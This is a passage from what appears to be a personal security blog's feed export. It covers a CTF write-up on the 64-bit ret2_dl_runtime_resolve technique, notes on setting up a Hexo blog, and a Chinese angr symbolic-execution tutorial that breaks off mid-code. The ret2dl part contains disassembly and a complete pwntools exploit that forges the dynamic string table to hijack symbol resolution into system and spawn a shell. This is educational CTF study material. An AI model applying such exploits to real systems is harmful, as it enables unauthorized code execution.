class="number">0000000000400380</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A9 aStrlen         db <span class="string">&#x27;strlen&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004002F</span>0↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>0 aRead           db <span class="string">&#x27;read&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400320</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>5 aStdout         db <span class="string">&#x27;stdout&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400368</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>C aSetbuf         db <span class="string">&#x27;setbuf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400308</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>C3 aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>Before that, we tampered with dynamic strtable into our fake dynstr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000600E20</span> _DYNAMIC        Elf64_Dyn &lt;<span class="number">1</span>, <span class="number">1</span>&gt;        ; DATA XREF: LOAD:<span class="number">0000000000400130</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0000000000600E30</span>                 Elf64_Dyn &lt;<span class="number">0</span>Ch, <span class="number">4004E8</span>h&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">0000000000600E40</span>                 Elf64_Dyn &lt;<span class="number">0</span>Dh, <span class="number">4007B</span>4h&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">0000000000600E50</span>                 Elf64_Dyn &lt;<span class="number">19</span>h, <span class="number">600E10</span>h&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E60</span>                 Elf64_Dyn &lt;<span class="number">1B</span>h, <span class="number">8</span>&gt;      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E70</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ah, <span class="number">600E18</span>h&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E80</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ch, <span class="number">8</span>&gt;      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E90</span>                 Elf64_Dyn &lt;<span class="number">6F</span>FFFEF5h, <span class="number">400298</span>h&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EA0                 Elf64_Dyn &lt;<span class="number">5</span>, <span class="number">400398</span>h&gt;  ; DT_STRTAB   I see here that it points directly to dynstr, and tampered with it to where we forged</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EB0                 Elf64_Dyn &lt;<span class="number">6</span>, <span class="number">4002</span>C0h&gt;  ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EC0                 Elf64_Dyn &lt;<span class="number">0</span>Ah, <span class="number">5</span>Eh&gt;    ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">0000000000600</span>ED0                 Elf64_Dyn &lt;<span class="number">0B</span>h, <span class="number">18</span>h&gt;    ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EE0                 Elf64_Dyn &lt;<span class="number">15</span>h, <span class="number">0</span>&gt;      ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EF0                 Elf64_Dyn &lt;<span class="number">3</span>, <span class="number">601000</span>h&gt;  ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>00                 Elf64_Dyn &lt;<span class="number">2</span>, <span class="number">60</span>h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>10                 Elf64_Dyn &lt;<span class="number">14</span>h, <span class="number">7</span>&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>20                 Elf64_Dyn &lt;<span class="number">17</span>h, <span class="number">400488</span>h&gt; ; DT_JMPRELc</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>30                 Elf64_Dyn &lt;<span class="number">7</span>, <span class="number">400428</span>h&gt;  ; DT_RELA</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>40                 Elf64_Dyn &lt;<span class="number">8</span>, <span class="number">60</span>h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>50                 Elf64_Dyn &lt;<span class="number">9</span>, <span class="number">18</span>h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>60                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFEh, <span class="number">400408</span>h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>70                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFFh, <span class="number">1</span>&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>80                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFF0h, <span class="number">4003F</span>6h&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>90                 Elf64_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>Finally, let’s look at the most important functions, the source code:</p><p>strtab + sym-&gt;st_name this time is pointing to our system, where we just tampered with strlen as system</p><p>Debugging is too complicated, many macro definitions, mainly as follows, directly complete the hijacking</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">  <span class="number">0x7f3ab197ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rcsp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">► <span class="number">0x7f3ab197ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">  <span class="number">0x7f3ab197ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">  <span class="number">0x7f3ab197ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">  <span class="number">0x7f3ab197ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Directly use the script of the online master as a template:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line"><span class="comment">#The target of our attack, the address of strtab in .dynamic, we have to modify it here to point to fake_dynstr</span></span><br><span class="line">target_addr = <span class="number">0x600988</span> + <span class="number">8</span>  </span><br><span class="line"><span class="comment">#The function used to load the function address, when we fake dynstr, call it again to load the function we need</span></span><br><span class="line">plt0_load = <span class="number">0x4004D0</span>   </span><br><span class="line"><span class="comment">#pop rdi;ret;  </span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span> </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x400771</span></span><br><span class="line"><span class="comment">#伪造dynstr  </span></span><br><span class="line">fake_dynstr = <span class="string">&#x27;\x00libc.so.6\x00stdin\x00system\x00&#x27;</span> <span class="comment">#原本dynstr为\x00libc.so.6\x00stdin\x00strlen\x00&#x27;</span></span><br><span class="line">bss = <span class="number">0x600B30</span>  </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> , pop_rdi , <span class="number">0</span> , pop_rsi , bss , <span class="number">0</span> , read_plt , <span class="comment"># Write &#x27;/bin/sh&#x27; and fake strtab to bss segment</span></span><br><span class="line">                pop_rdi , <span class="number">0</span> , pop_rsi , target_addr , <span class="number">0</span> , read_plt , <span class="comment"># Change the strtab address in .dynamic to the address of our fake strtab</span></span><br><span class="line">                pop_rdi , bss , plt0_load , <span class="number">1</span> <span class="comment"># Call .dl_fixup to parse the strlen function. Since we have replaced strlen with system in fake_strtab, the system function will be parsed</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line"><span class="comment">#Send system parameters and fake strtab</span></span><br><span class="line">payload2 = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + fake_dynstr  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">r.sendline(payload2)  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#Modify the address of strtab in dynsym to the address of our forged dynstr</span></span><br><span class="line">r.sendline(p64(bss + <span class="number">0x10</span>))  </span><br><span class="line">r.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days"><a href="#So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days" class="headerlink" title="So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !"></a>So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2-dl-runtime-resolve-x86-x64&quot;&gt;&lt;a href=&quot;#ret2-dl-runtime-resolve-x86-x64&quot; class=&quot;headerlink&quot; title=&quot;ret2_dl_runtime_resolve(x86&amp;#x</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>create_website</title>
    <link href="https://jsjsj.top/2023/10/03/create-website/"/>
    <id>https://jsjsj.top/2023/10/03/create-website/</id>
    <published>2023-10-03T14:01:04.000Z</published>
    <updated>2023-10-05T01:41:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/dxxzst/article/details/76135935">https://blog.csdn.net/dxxzst/article/details/76135935</a><br><a href="https://blog.csdn.net/wushibo123/article/details/124619123">https://blog.csdn.net/wushibo123/article/details/124619123</a><br><a href="https://huaweicloud.csdn.net/638eaae1dacf622b8df8cdee.html">https://huaweicloud.csdn.net/638eaae1dacf622b8df8cdee.html</a><br><a href="https://blog.csdn.net/weixin_43642577/article/details/126713252">https://blog.csdn.net/weixin_43642577/article/details/126713252</a><br>创建页面配置：<a href="https://blog.csdn.net/qq_59016701/article/details/132576005">https://blog.csdn.net/qq_59016701/article/details/132576005</a></p><p>重要的配置连接github，如果无法生成idsa，在连接的时候给它改下</p><p><a href="https://blog.csdn.net/wushibo123/article/details/124619123">https://blog.csdn.net/wushibo123/article/details/124619123</a></p><p><a href="https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/">https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建文章hexo n 文章名</span><br><span class="line"></span><br><span class="line">新建page：hexo n page about</span><br><span class="line"></span><br><span class="line">上传hexo clean  &amp;hexo s(d)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本博客模板插件</span><br><span class="line">npm install --save hexo-theme-fluid</span><br><span class="line">安装到了node_modules文件下的hexo-theme-fluid，将文件里的cofig.yml配置文件拷贝到blog根目录下改成_config.fluid.yml，然后在根目录下_config.yml，指定主题类型为theme: fluid即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">隐藏文章</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">文章标题</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">/img/example.jpg</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-10-10 10:00:00</span></span><br><span class="line"><span class="attr">hide:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">以下是文章内容</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">归档文章</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">文章标题</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">/img/example.jpg</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-10-10 10:00:00</span></span><br><span class="line"><span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">以下是文章内容</span></span><br></pre></td></tr></table></figure><p>添加评论：<a href="https://blog.csdn.net/m0_51321469/article/details/127174188">https://blog.csdn.net/m0_51321469/article/details/127174188</a></p><p><a href="https://valine.js.org/quickstart.html">https://valine.js.org/quickstart.html</a></p><p>hexo new page about&#x2F;friends</p><p> — title: 置顶文章 </p><p>sticky: true —</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/dxxzst/article/details/76135935&quot;&gt;https://blog.csdn.net/dxxzst/article/details/76135935&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;htt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF Angr 符号执行学习（一）</title>
    <link href="https://jsjsj.top/2022/12/03/CTF%20Angr%20%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/"/>
    <id>https://jsjsj.top/2022/12/03/CTF%20Angr%20%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-12-03T14:17:58.000Z</published>
    <updated>2023-10-04T06:36:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-Angr-符号执行学习（一）"><a href="#CTF-Angr-符号执行学习（一）" class="headerlink" title="CTF Angr 符号执行学习（一）"></a>CTF Angr 符号执行学习（一）</h1><h2 id="前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了"><a href="#前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了" class="headerlink" title="前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了"></a>前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了</h2><h2 id="一、00"><a href="#一、00" class="headerlink" title="一、00"></a>一、00</h2><p>我们要用到两个模块，一个angr和一个sys</p><p>angr进行符号执行，sys来进行用户输入输出</p><p>我们第一步要进行angr脚本去跑约束逆向的时候，</p><p>第一步：</p><p>1.创建文件项目：</p><p>proj&#x3D;angr.Project(binary,auto_load_libs&#x3D;False)，不加载libc</p><p>2.初始化地址块 </p><p>state&#x3D;proj.factory.entry_state()   这里的块初始化到了程序的start 块</p><p>3.初始化以后，我们要对这个块进行模拟</p><p>sim&#x3D;proj.factory.simgr(state)</p><p>4.模拟后，开始寻找正确的路径</p><p>ok_address&#x3D;0x8048675<br>sim.explore(find&#x3D;ok_address)  这里是我们输出正确的路径</p><p>5.搜索到路径后，把状态放到sim.found[0]里，然后从这个状态里取出来即可</p><pre><code>if sim.found:    solution_state=sim.found[0]    print(solution_state.posix.dumps(sys.stdin.fileno()).decode())</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./00_angr_find&quot;</span></span><br><span class="line">    proj=angr.Project(binary,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x8048675</span></span><br><span class="line">    sim.explore(find=ok_address)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="二、01"><a href="#二、01" class="headerlink" title="二、01"></a>二、01</h2><p>这个案例，前面部分跟00一样，在寻找路径的时候，explore的时候加个avoid参数，这个参数就避开错误代码块的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./01_angr_avoid&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x80485E0</span></span><br><span class="line">    bi_kai=<span class="number">0x80485A8</span></span><br><span class="line">    sim.explore(find=ok_address,avoid=bi_kai)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no !!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="三、02"><a href="#三、02" class="headerlink" title="三、02"></a>三、02</h2><p>这里刚上面一样，唯一的区别就是，自己写了一个避开的函数和正确的函数，赋给了find和avoid，效果都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./02_angr_find_condition&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    init_state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x08048715</span></span><br><span class="line">    sim.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="四、03-regs-寄存器"><a href="#四、03-regs-寄存器" class="headerlink" title="四、03  regs 寄存器"></a>四、03  regs 寄存器</h2><p>这里就有特点了，对寄存器的操作</p><p>我们看题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 user_input; // rax</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+4h] [ebp-14h]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp+8h] [ebp-10h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  user_input = get_user_input();</span><br><span class="line">  v7 = HIDWORD(user_input);</span><br><span class="line">  v5 = complex_function_1(user_input);</span><br><span class="line">  v6 = complex_function_2();</span><br><span class="line">  v8 = complex_function_3(v7);</span><br><span class="line">  <span class="keyword">if</span> ( v5 || v6 || v8 )</span><br><span class="line">    puts(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_user_input：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> get_user_input()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+4h] 